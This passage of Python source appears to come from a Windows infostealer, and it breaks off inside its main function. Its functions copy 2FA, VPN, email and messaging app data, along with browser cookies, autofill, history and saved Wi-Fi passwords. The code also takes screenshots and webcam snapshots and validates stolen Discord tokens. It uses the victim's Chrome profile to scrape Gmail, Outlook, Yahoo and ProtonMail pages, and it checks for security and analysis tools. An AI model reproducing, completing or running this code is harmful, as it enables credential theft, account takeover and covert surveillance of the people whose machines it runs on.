    dest = os.path.join(td, "gaming")
    os.makedirs(dest, exist_ok=True)
    for platform_name, paths in GAMING_PATHS.items():
        for p in paths:
            if not os.path.exists(p):
                continue
            try:
                pname = platform_name.replace(" ", "_")
                pdest = os.path.join(dest, pname)
                if os.path.isdir(p):
                    _safe_copy_dir(p, pdest)
                    results.append({"platform": platform_name, "path": p, "type": "dir"})
            except Exception:
                pass
    return results


# ==========================================
# VPN CONFIG GRABBER
# ==========================================

def grab_vpn_configs(td):
    results = []
    dest = os.path.join(td, "vpn")
    os.makedirs(dest, exist_ok=True)
    for vpn_name, paths in VPN_PATHS.items():
        for p in paths:
            if not os.path.exists(p):
                continue
            try:
                vname = vpn_name.replace(" ", "_")
                vdest = os.path.join(dest, vname)
                if os.path.isdir(p):
                    _safe_copy_dir(p, vdest)
                    results.append({"vpn": vpn_name, "path": p})
            except Exception:
                pass
    return results


# ==========================================
# EMAIL CLIENT GRABBER
# ==========================================

def grab_email_clients(td):
    results = []
    dest = os.path.join(td, "emails")
    os.makedirs(dest, exist_ok=True)
    for email_name, paths in EMAIL_PATHS.items():
        for p in paths:
            if not os.path.exists(p):
                continue
            try:
                ename = email_name.replace(" ", "_")
                edest = os.path.join(dest, ename)
                if os.path.isdir(p):
                    _safe_copy_dir(p, edest)
                    results.append({"client": email_name, "path": p})
            except Exception:
                pass
    return results


# ==========================================
# 2FA APP GRABBER
# ==========================================

def grab_2fa_apps(td):
    results = []
    dest = os.path.join(td, "2fa")
    os.makedirs(dest, exist_ok=True)
    for app_name, paths in AUTH_2FA_PATHS.items():
        for p in paths:
            if not os.path.exists(p):
                continue
            try:
                aname = app_name.replace(" ", "_")
                adest = os.path.join(dest, aname)
                if os.path.isdir(p):
                    _safe_copy_dir(p, adest)
                    results.append({"app": app_name, "path": p})
            except Exception:
                pass
    return results


# ==========================================
# CLIPBOARD GRABBER
# ==========================================

def grab_clipboard():
    try:
        import tkinter
        root = tkinter.Tk()
        root.withdraw()
        clip = root.clipboard_get()
        root.destroy()
        if clip and len(clip) > 0:
            return clip[:5000]
    except Exception:
        pass
    return ""


# ==========================================
# INSTALLED SOFTWARE LIST
# ==========================================

def grab_installed_software():
    results = []
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command",
             "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | "
             "Select-Object DisplayName | "
             "Where-Object { $_.DisplayName -ne $null } | "
             "ConvertTo-Csv -NoTypeInformation"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        out, _ = p.communicate(timeout=10)
        lines = out.decode(errors="replace").strip().split("\n")
        for line in lines[1:]:
            name = line.strip().strip('"')
            if name:
                results.append(name)
    except Exception:
        pass
    return results


# ==========================================
# PRODUCT KEYS GRABBER
# ==========================================

def grab_product_keys():
    results = {}
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command",
             "(Get-CimInstance -ClassName SoftwareLicensingService).OA3xOriginalProductKey"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        out, _ = p.communicate(timeout=8)
        key = out.decode(errors="replace").strip()
        if key and len(key) > 10:
            results["Windows"] = key
    except Exception:
        pass
    return results


# ==========================================
# BROWSER AUTOFILL GRABBER
# ==========================================

def grab_browser_autofill(td):
    results = {"cards": [], "addresses": [], "phone_numbers": []}
    local = os.getenv("LOCALAPPDATA")
    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "."))
    chromium_browsers = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")),
        ("Opera GX", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data")),
    ]
    for browser_name, base_path in chromium_browsers:
        if not os.path.exists(base_path):
            continue
        profiles = ["Default"]
        try:
            for d in os.listdir(base_path):
                if d.startswith("Profile "):
                    profiles.append(d)
        except Exception:
            pass
        for profile in profiles:
            web_data_path = os.path.join(base_path, profile, "Web Data")
            if not os.path.exists(web_data_path):
                web_data_path = os.path.join(base_path, profile, "Network", "Web Data")
            if not os.path.exists(web_data_path):
                continue
            try:
                tmp_db = os.path.join(temp_dir, f"autofill_{browser_name}_{profile}_{os.getpid()}.db")
                copyfile(web_data_path, tmp_db)
                db = connect(tmp_db)
                cursor = db.cursor()
                try:
                    cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
                    for name, enc_num, exp_month, exp_year in cursor.fetchall():
                        results["cards"].append({
                            "browser": browser_name, "name": name or "",
                            "number_encrypted": True, "exp": f"{exp_month}/{exp_year}"
                        })
                except Exception:
                    pass
                try:
                    cursor.execute("SELECT street_address, city, state, zip_code, country_code FROM autofill_profiles")
                    for street, city, state, zip_code, country in cursor.fetchall():
                        results["addresses"].append({
                            "browser": browser_name, "street": street or "",
                            "city": city or "", "state": state or "",
                            "zip": zip_code or "", "country": country or ""
                        })
                except Exception:
                    pass
                try:
                    cursor.execute("SELECT value FROM autofill WHERE field_name LIKE '%phone%'")
                    for (val,) in cursor.fetchall():
                        if val:
                            results["phone_numbers"].append({"browser": browser_name, "number": val})
                except Exception:
                    pass
                cursor.close()
                db.close()
                try:
                    os.remove(tmp_db)
                except Exception:
                    pass
            except Exception:
                pass
    return results


# ==========================================
# DISCORD GUILDS & FRIENDS
# ==========================================

def grab_discord_info(tokens):
    results = {"guilds": [], "friends": [], "dms": []}
    for tk in tokens:
        if tk.startswith("dQw4w9WgXcQ:"):
            continue
        try:
            headers = {"Authorization": tk}
            resp = get("https://discord.com/api/v10/users/@me/guilds", headers=headers, timeout=5)
            if resp.status_code == 200:
                for guild in resp.json():
                    results["guilds"].append({
                        "name": guild.get("name", ""),
                        "id": guild.get("id", ""),
                        "owner": guild.get("owner", False),
                    })
            resp = get("https://discord.com/api/v10/users/@me/relationships", headers=headers, timeout=5)
            if resp.status_code == 200:
                for friend in resp.json():
                    results["friends"].append({
                        "username": friend.get("user", {}).get("username", ""),
                        "id": friend.get("user", {}).get("id", ""),
                        "type": friend.get("type", 0),
                    })
            break
        except Exception:
            continue
    return results


# ==========================================
# BROWSER BOOKMARKS & DOWNLOADS
# ==========================================

def grab_browser_bookmarks_downloads(td):
    results = {"bookmarks": [], "downloads": []}
    local = os.getenv("LOCALAPPDATA")
    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "."))
    chromium_browsers = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")),
        ("Opera GX", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data")),
    ]
    for browser_name, base_path in chromium_browsers:
        if not os.path.exists(base_path):
            continue
        profiles = ["Default"]
        try:
            for d in os.listdir(base_path):
                if d.startswith("Profile "):
                    profiles.append(d)
        except Exception:
            pass
        for profile in profiles:
            bookmarks_path = os.path.join(base_path, profile, "Bookmarks")
            if os.path.exists(bookmarks_path):
                try:
                    with open(bookmarks_path, "r", encoding="utf-8") as f:
                        bm_data = loads(f.read())
                    def extract_bookmarks(node, path=""):
                        if isinstance(node, dict):
                            if node.get("type") == "url":
                                results["bookmarks"].append({
                                    "browser": browser_name, "name": node.get("name", ""),
                                    "url": node.get("url", "")
                                })
                            children = node.get("children", [])
                            for child in children:
                                extract_bookmarks(child, path)
                    roots = bm_data.get("roots", {})
                    for root_key in roots:
                        if isinstance(roots[root_key], dict):
                            extract_bookmarks(roots[root_key])
                except Exception:
                    pass
            history_path = os.path.join(base_path, profile, "History")
            if not os.path.exists(history_path):
                history_path = os.path.join(base_path, profile, "Network", "History")
            if os.path.exists(history_path):
                try:
                    tmp_db = os.path.join(temp_dir, f"dl_{browser_name}_{profile}_{os.getpid()}.db")
                    copyfile(history_path, tmp_db)
                    db = connect(tmp_db)
                    cursor = db.cursor()
                    cursor.execute("SELECT target_path, tab_url, total_bytes, start_time FROM downloads ORDER BY start_time DESC")
                    for path, url, size, start_time in cursor.fetchall():
                        results["downloads"].append({
                            "browser": browser_name, "path": path or "",
                            "url": url or "", "size": size or 0
                        })
                    cursor.close()
                    db.close()
                    try:
                        os.remove(tmp_db)
                    except Exception:
                        pass
                except Exception:
                    pass
    return results


# ==========================================
# SCREENSHOT GRABBER
# ==========================================

def grab_screenshot(td):
    paths = []
    try:
        from PIL import ImageGrab
        scrn = ImageGrab.grab(all_screens=True)
        p = os.path.join(td, "screenshot.png")
        scrn.save(p, "PNG")
        paths.append(p)
    except Exception:
        pass
    return paths


# ==========================================
# CAMERA SNAPSHOT GRABBER
# ==========================================

def grab_camera_snapshot(td):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None
        p = os.path.join(td, "camera.jpg")
        cv2.imwrite(p, frame)
        return p
    except Exception:
        return None


# ==========================================
# ALL BROWSER COOKIES GRABBER
# ==========================================

def grab_all_cookies(td):
    results = []
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "."))
    chromium_browsers = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(roaming, "Opera Software", "Opera Stable")),
        ("Opera GX", os.path.join(roaming, "Opera Software", "Opera GX Stable")),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data")),
        ("Yandex", os.path.join(local, "Yandex", "YandexBrowser", "User Data")),
    ]
    for browser_name, base_path in chromium_browsers:
        if not os.path.exists(base_path):
            continue
        profiles = ["Default"]
        try:
            for d in os.listdir(base_path):
                if d.startswith("Profile "):
                    profiles.append(d)
        except Exception:
            pass
        for profile in profiles:
            cookie_path = os.path.join(base_path, profile, "Network", "Cookies")
            if not os.path.exists(cookie_path):
                cookie_path = os.path.join(base_path, profile, "Cookies")
            if not os.path.exists(cookie_path):
                continue
            try:
                tmp_db = os.path.join(temp_dir, f"cookies_{browser_name}_{profile}_{os.getpid()}.db")
                copyfile(cookie_path, tmp_db)
                db = connect(tmp_db)
                cursor = db.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies LIMIT 500")
                for host, name, enc_val, path, expires in cursor.fetchall():
                    results.append({
                        "browser": browser_name, "host": host,
                        "name": name, "encrypted": True,
                        "path": path, "expires": expires
                    })
                cursor.close()
                db.close()
                try:
                    os.remove(tmp_db)
                except Exception:
                    pass
            except Exception:
                pass
    return results


# ==========================================
# ALL SAVED WIFI NETWORKS
# ==========================================

def grab_all_wifi():
    results = []
    try:
        p = Popen(
            ["netsh", "wlan", "show", "profiles"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        out, _ = p.communicate(timeout=10)
        output = out.decode(errors="replace")
        profiles = findall(r"All User Profile\s+:\s+(.*)", output)
        for profile in profiles:
            profile = profile.strip()
            try:
                p2 = Popen(
                    ["netsh", "wlan", "show", "profile", f'"{profile}"', "key=clear"],
                    shell=True, stdout=PIPE, stderr=PIPE
                )
                out2, _ = p2.communicate(timeout=5)
                out2 = out2.decode(errors="replace")
                key_match = search(r"Key Content\s+:\s+(.*)", out2)
                auth_match = search(r"Authentication\s+:\s+(.*)", out2)
                cipher_match = search(r"Cipher\s+:\s+(.*)", out2)
                password = key_match.group(1).strip() if key_match else "N/A"
                auth = auth_match.group(1).strip() if auth_match else "Unknown"
                cipher = cipher_match.group(1).strip() if cipher_match else "Unknown"
                results.append({"ssid": profile, "password": password, "auth": auth, "cipher": cipher})
            except Exception:
                pass
    except Exception:
        pass
    return results


# ==========================================
# DETAILED SYSTEM INFO
# ==========================================

def grab_system_info():
    info = {}
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command",
             "Get-CimInstance Win32_VideoController | Select-Object Name, DriverVersion, AdapterRAM | ConvertTo-Csv -NoTypeInformation"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        out, _ = p.communicate(timeout=10)
        lines = out.decode(errors="replace").strip().split("\n")
        gpus = []
        for line in lines[1:]:
            parts = line.strip().strip('"').split('","')
            if len(parts) >= 1 and parts[0].strip('"'):
                gpus.append(parts[0].strip('"'))
        info["gpu"] = gpus
    except Exception:
        info["gpu"] = []
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command",
             "Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer, Product, SerialNumber | ConvertTo-Csv -NoTypeInformation"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        out, _ = p.communicate(timeout=10)
        lines = out.decode(errors="replace").strip().split("\n")
        if len(lines) > 1:
            parts = lines[1].strip().strip('"').split('","')
            info["motherboard"] = {
                "manufacturer": parts[0].strip('"') if len(parts) > 0 else "",
                "product": parts[1].strip('"') if len(parts) > 1 else "",
                "serial": parts[2].strip('"') if len(parts) > 2 else "",
            }
    except Exception:
        info["motherboard"] = {}
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command",
             "Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber, SMBIOSBIOSVersion | ConvertTo-Csv -NoTypeInformation"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        out, _ = p.communicate(timeout=10)
        lines = out.decode(errors="replace").strip().split("\n")
        if len(lines) > 1:
            parts = lines[1].strip().strip('"').split('","')
            info["bios"] = {
                "manufacturer": parts[0].strip('"') if len(parts) > 0 else "",
                "serial": parts[1].strip('"') if len(parts) > 1 else "",
                "version": parts[2].strip('"') if len(parts) > 2 else "",
            }
    except Exception:
        info["bios"] = {}
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command",
             "Get-CimInstance Win32_DiskDrive | Select-Object Model, SerialNumber, Size | ConvertTo-Csv -NoTypeInformation"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        out, _ = p.communicate(timeout=10)
        lines = out.decode(errors="replace").strip().split("\n")
        disks = []
        for line in lines[1:]:
            parts = line.strip().strip('"').split('","')
            if len(parts) >= 1 and parts[0].strip('"'):
                disks.append({
                    "model": parts[0].strip('"'),
                    "serial": parts[1].strip('"') if len(parts) > 1 else "",
                    "size_gb": round(int(parts[2].strip('"')) / (1024**3), 1) if len(parts) > 2 and parts[2].strip('"').isdigit() else 0,
                })
        info["disks"] = disks
    except Exception:
        info["disks"] = []
    return info


# ==========================================
# MESSAGING APPS PATHS
# ==========================================

MESSAGING_PATHS = {
    "Signal": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Programs", "signal-desktop"),
               os.path.join(os.getenv("APPDATA", ""), "Signal")],
    "Session": [os.path.join(os.getenv("APPDATA", ""), "Session")],
    "Element": [os.path.join(os.getenv("APPDATA", ""), "Element")],
    "Jami": [os.path.join(os.getenv("LOCALAPPDATA", ""), "Jami")],
    "Wire": [os.path.join(os.getenv("APPDATA", ""), "Wire")],
    "Slack": [os.path.join(os.getenv("APPDATA", ""), "Slack")],
    "Teams": [os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Teams")],
}

def grab_messaging_apps(td):
    results = []
    dest = os.path.join(td, "messaging")
    os.makedirs(dest, exist_ok=True)
    for app_name, paths in MESSAGING_PATHS.items():
        for p in paths:
            if not os.path.exists(p):
                continue
            try:
                aname = app_name.replace(" ", "_")
                adest = os.path.join(dest, aname)
                if os.path.isdir(p):
                    _safe_copy_dir(p, adest)
                    results.append({"app": app_name, "path": p})
            except Exception:
                pass
    return results


# ==========================================
# DISCORD TOKEN VALIDATION
# ==========================================

def validate_discord_tokens(tokens):
    valid = []
    for tk in tokens:
        if tk.startswith("dQw4w9WgXcQ:"):
            continue
        try:
            resp = get("https://discord.com/api/v10/users/@me", headers={"Authorization": tk}, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                valid.append({
                    "token": tk,
                    "username": f"{data.get('username', '')}#{data.get('discriminator', '')}",
                    "id": data.get("id", ""),
                    "email": data.get("email", ""),
                    "phone": data.get("phone", ""),
                    "mfa": data.get("mfa_enabled", False),
                    "verified": data.get("verified", False),
                    "nitro": bool(data.get("premium_type", 0)),
                })
        except Exception:
            pass
    return valid


# ==========================================
# WEBMAIL EMAIL EXTRACTION (Selenium)
# ==========================================

_EMAIL_REGEX = compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')

def grab_webmail_emails(td):
    results = {"emails": [], "accounts": [], "subjects": []}
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
    except Exception:
        return results

    local = os.getenv("LOCALAPPDATA")
    chrome_user_data = os.path.join(local, "Google", "Chrome", "User Data")
    if not os.path.exists(chrome_user_data):
        return results

    chrome_paths = [
        os.path.join(os.getenv("ProgramFiles", ""), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("ProgramFiles(x86)", ""), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(local, "Google", "Chrome", "Application", "chrome.exe"),
    ]
    chrome_exe = None
    for cp in chrome_paths:
        if os.path.exists(cp):
            chrome_exe = cp
            break
    if not chrome_exe:
        return results

    options = Options()
    options.binary_location = chrome_exe
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-plugins")
    options.add_argument(f"--user-data-dir={chrome_user_data}")
    options.add_argument("--profile-directory=Default")
    options.add_argument("--window-size=1280,800")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)

    try:
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(15)
    except Exception:
        return results

    email_set = set()
    accounts = []
    subjects = []

    # --- Gmail (basic HTML version - easy to parse) ---
    try:
        driver.get("https://mail.google.com/mail/u/0/h/")
        time.sleep(3)
        page_src = driver.page_source

        # Extract the logged-in account email
        try:
            account_el = driver.find_elements(By.CSS_SELECTOR, "b")
            for el in account_el:
                txt = el.text.strip()
                if "@" in txt and "." in txt:
                    accounts.append(txt)
                    email_set.add(txt)
                    break
        except Exception:
            pass

        # Extract email addresses from page source
        for m in _EMAIL_REGEX.findall(page_src):
            if not m.endswith((".png", ".jpg", ".gif", ".css", ".js", ".ico")):
                email_set.add(m)

        # Try to get email subjects from the inbox table
        try:
            rows = driver.find_elements(By.CSS_SELECTOR, "tr td")
            for row in rows[:50]:
                txt = row.text.strip()
                if txt and len(txt) > 5 and len(txt) < 200:
                    subjects.append(txt)
        except Exception:
            pass

        # Try multiple Gmail accounts (u/1, u/2, etc.)
        for i in range(1, 4):
            try:
                driver.get(f"https://mail.google.com/mail/u/{i}/h/")
                time.sleep(2)
                src = driver.page_source
                if "Sign in" not in src and "accounts.google.com" not in src:
                    for m in _EMAIL_REGEX.findall(src):
                        if not m.endswith((".png", ".jpg", ".gif", ".css", ".js", ".ico")):
                            email_set.add(m)
                    try:
                        account_el = driver.find_elements(By.CSS_SELECTOR, "b")
                        for el in account_el:
                            txt = el.text.strip()
                            if "@" in txt and "." in txt:
                                accounts.append(txt)
                                email_set.add(txt)
                                break
                    except Exception:
                        pass
                else:
                    break
            except Exception:
                break
    except Exception:
        pass

    # --- Outlook Web (outlook.live.com / outlook.office.com) ---
    try:
        driver.get("https://outlook.live.com/mail/0/")
        time.sleep(4)
        page_src = driver.page_source
        for m in _EMAIL_REGEX.findall(page_src):
            if not m.endswith((".png", ".jpg", ".gif", ".css", ".js", ".ico")):
                email_set.add(m)
        # Try to get the logged-in account
        try:
            btns = driver.find_elements(By.CSS_SELECTOR, "[aria-label]")
            for btn in btns[:20]:
                txt = btn.get_attribute("aria-label")
                if txt and "@" in txt and "." in txt:
                    accounts.append(txt)
                    email_set.add(txt)
                    break
        except Exception:
            pass
    except Exception:
        pass

    # --- Yahoo Mail ---
    try:
        driver.get("https://mail.yahoo.com/")
        time.sleep(4)
        page_src = driver.page_source
        for m in _EMAIL_REGEX.findall(page_src):
            if not m.endswith((".png", ".jpg", ".gif", ".css", ".js", ".ico")):
                email_set.add(m)
    except Exception:
        pass

    # --- ProtonMail ---
    try:
        driver.get("https://mail.proton.me/")
        time.sleep(5)
        page_src = driver.page_source
        for m in _EMAIL_REGEX.findall(page_src):
            if not m.endswith((".png", ".jpg", ".gif", ".css", ".js", ".ico")):
                email_set.add(m)
    except Exception:
        pass

    try:
        driver.quit()
    except Exception:
        pass

    # Filter
    filtered = set()
    for e in email_set:
        e_lower = e.lower()
        if e_lower.endswith((".png", ".jpg", ".gif", ".css", ".js", ".ico", ".svg")):
            continue
        if e_lower.startswith(("noreply@", "no-reply@")) and "discord" not in e_lower:
            continue
        if len(e) > 100:
            continue
        filtered.add(e)

    results["emails"] = sorted(filtered)
    results["accounts"] = list(set(accounts))
    results["subjects"] = subjects[:30]
    return results


# ==========================================
# EMAIL EXTRACTION
# ==========================================

def grab_emails(main_info, td):
    emails = set()

    # From validated Discord tokens
    for v in main_info.get("validated_tokens", []):
        if v.get("email") and "@" in v["email"]:
            emails.add(v["email"])

    # From browser passwords (username field often contains email)
    for pw in main_info.get("browser_passwords", []):
        try:
            if len(pw) >= 1 and "@" in str(pw[0]):
                emails.add(str(pw[0]))
        except Exception:
            pass

    # From Firefox passwords
    for fw in main_info.get("firefox_passwords", []):
        try:
            if fw.get("username") and "@" in fw["username"]:
                emails.add(fw["username"])
        except Exception:
            pass

    # From autofill
    for card in main_info.get("autofill", {}).get("cards", []):
        try:
            if card.get("name") and "@" in card["name"]:
                emails.add(card["name"])
        except Exception:
            pass

    # From payment info (PayPal email = type 2, field 0)
    for p in main_info.get("payment_info", []):
        try:
            if p[1] == 2 and "@" in str(p[0]):
                emails.add(str(p[0]))
        except Exception:
            pass

    # From clipboard
    cb = main_info.get("clipboard", "")
    if cb:
        for m in _EMAIL_REGEX.findall(cb):
            emails.add(m)

    # From Outlook OST/PST profiles - extract account info
    try:
        local = os.getenv("LOCALAPPDATA")
        roaming = os.getenv("APPDATA")
        outlook_paths = [
            os.path.join(local, "Microsoft", "Outlook"),
            os.path.join(roaming, "Microsoft", "Outlook"),
        ]
        for op in outlook_paths:
            if not os.path.exists(op):
                continue
            for root, _, files in os.walk(op):
                for f in files:
                    if f.lower().endswith((".xml", ".ini", ".config", ".txt")):
                        try:
                            fsize = os.path.getsize(os.path.join(root, f))
                            if fsize > 1024 * 1024:
                                continue
                            with open(os.path.join(root, f), "r", errors="replace") as fh:
                                content = fh.read()
                                for m in _EMAIL_REGEX.findall(content):
                                    if not m.endswith((".png", ".jpg", ".gif", ".css", ".js")):
                                        emails.add(m)
                        except Exception:
                            pass
    except Exception:
        pass

    # From Thunderbird prefs.js
    try:
        roaming = os.getenv("APPDATA")
        tb_profiles = os.path.join(roaming, "Thunderbird", "Profiles")
        if os.path.exists(tb_profiles):
            for prof in os.listdir(tb_profiles):
                prefs = os.path.join(tb_profiles, prof, "prefs.js")
                if os.path.exists(prefs):
                    try:
                        with open(prefs, "r", errors="replace") as fh:
                            content = fh.read()
                            for m in _EMAIL_REGEX.findall(content):
                                if not m.endswith((".png", ".jpg", ".gif", ".css", ".js")):
                                    emails.add(m)
                    except Exception:
                        pass
    except Exception:
        pass

    # From Windows Mail app
    try:
        local = os.getenv("LOCALAPPDATA")
        mail_app = os.path.join(local, "Packages")
        if os.path.exists(mail_app):
            for d in os.listdir(mail_app):
                if "mail" in d.lower() or "outlook" in d.lower():
                    for root, _, files in os.walk(os.path.join(mail_app, d)):
                        for f in files:
                            if f.lower().endswith((".xml", ".ini", ".txt", ".json")):
                                try:
                                    fp = os.path.join(root, f)
                                    if os.path.getsize(fp) > 512 * 1024:
                                        continue
                                    with open(fp, "r", errors="replace") as fh:
                                        content = fh.read()
                                        for m in _EMAIL_REGEX.findall(content):
                                            if not m.endswith((".png", ".jpg", ".gif", ".css", ".js")):
                                                emails.add(m)
                                except Exception:
                                    pass
    except Exception:
        pass

    # Filter out obvious non-email matches
    filtered = set()
    for e in emails:
        e_lower = e.lower()
        if e_lower.endswith((".png", ".jpg", ".gif", ".css", ".js", ".ico", ".svg")):
            continue
        if e_lower.startswith(("noreply@", "no-reply@")) and "discord" not in e_lower:
            continue
        if len(e) > 100:
            continue
        filtered.add(e)

    return sorted(filtered)


# ==========================================
# SECURITY TOOLS DETECTION
# ==========================================

def detect_security_tools():
    tools = []
    tool_names = ["wireshark", "nmap", "processhacker", "procmon", "autoruns", "fiddler",
                  "ollydbg", "x64dbg", "x32dbg", "ida", "ghidra", "radare", "hxd",
                  "vmware", "vbox", "virtualbox", "sandboxie", "die", "exeinfope"]
    try:
        p = Popen(
            ["powershell", "-NoProfile", "-Command",
             "Get-Process | Select-Object -ExpandProperty ProcessName"],
            shell=True, stdout=PIPE, stderr=PIPE
        )
        out, _ = p.communicate(timeout=10)
        processes = out.decode(errors="replace").lower()
        for tool in tool_names:
            if tool in processes:
                tools.append(tool)
    except Exception:
        pass
    return tools


# ==========================================
# FILE GRABBER
# ==========================================

def grab_sensitive_files(td):
    results = []
    dest = os.path.join(td, "sensitive_files")
    os.makedirs(dest, exist_ok=True)
    for search_dir in FILE_GRABBER_DIRS:
        if not os.path.exists(search_dir):
            continue
        try:
            for root, dirs, files in os.walk(search_dir):
                for f in files:
                    fpath = os.path.join(root, f)
                    f_lower = f.lower()
                    matched = False
                    for kw in FILE_GRABBER_KEYWORDS:
                        if kw in f_lower:
                            matched = True
                            break
                    if not matched:
                        _, ext = os.path.splitext(f)
                        if ext.lower() not in FILE_GRABBER_EXTENSIONS:
                            continue
                    try:
                        size = os.path.getsize(fpath)
                        if size > 5 * 1024 * 1024:
                            continue
                        dest_path = os.path.join(dest, f"_{f}")
                        copyfile(fpath, dest_path)
                        results.append({"name": f, "path": fpath, "size": size, "matched": matched})
                    except Exception:
                        pass
        except Exception:
            pass
    return results


# ==========================================
# BROWSER HISTORY
# ==========================================

def find_His():
    table = PrettyTable(padding_width=1)
    table.field_names = ["Browser", "Time", "Link"]
    local = os.getenv("LOCALAPPDATA")
    temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "."))
    history_dbs = []
    chromium_bases = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data")),
        ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")),
        ("Opera GX", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")),
        ("Yandex", os.path.join(local, "Yandex", "YandexBrowser", "User Data")),
    ]
    for browser_name, base_path in chromium_bases:
        profiles = ["Default"]
        try:
            for d in os.listdir(base_path):
                if d.startswith("Profile "):
                    profiles.append(d)
        except Exception:
            pass
        for profile in profiles:
            db_path = os.path.join(base_path, profile, "History")
            if not os.path.exists(db_path):
                db_path = os.path.join(base_path, profile, "Network", "History")
            if os.path.exists(db_path):
                history_dbs.append((browser_name, db_path))
    try:
        from browser_history import get_history as _gh
        for his in _gh().histories:
            a, b = his
            if len(b) <= 120:
                table.add_row(["Auto", str(a), b])
    except Exception:
        pass
    for browser_name, db_path in history_dbs:
        try:
            tmp_db = os.path.join(temp_dir, f"history_{browser_name}_{os.getpid()}.db")
            copyfile(db_path, tmp_db)
            db = connect(tmp_db)
            cursor = db.cursor()
            cursor.execute(
                "SELECT datetime(last_visit_time/1000000-11644473600, 'unixepoch'), url "
                "FROM urls ORDER BY last_visit_time DESC"
            )
            for visit_time, url in cursor.fetchall():
                if url and len(url) <= 120:
                    table.add_row([browser_name, str(visit_time), url])
                elif url:
                    short = url[:115] + "[...]"
                    table.add_row([browser_name, str(visit_time), short])
            cursor.close()
            db.close()
            try:
                os.remove(tmp_db)
            except Exception:
                pass
        except Exception:
            pass
    if len(table.rows) == 0:
        return "History not available"
    return table.get_string()


# ==========================================
# MAIN GRABBER
# ==========================================

def main(dirpath):
    chrome_psw_list = []
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    chromium_browsers = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(roaming, "Opera Software", "Opera Stable")),
        ("Opera GX", os.path.join(roaming, "Opera Software", "Opera GX Stable")),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data")),
        ("Yandex", os.path.join(local, "Yandex", "YandexBrowser", "User Data")),
        ("Epic", os.path.join(local, "Epic Privacy Browser", "User Data")),
        ("Chromium", os.path.join(local, "Chromium", "User Data")),
    ]
    for browser_name, browser_data_path in chromium_browsers:
        local_state_path = os.path.join(browser_data_path, "Local State")
        if not os.path.exists(local_state_path):
            continue
        key = None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                ls = loads(f.read())
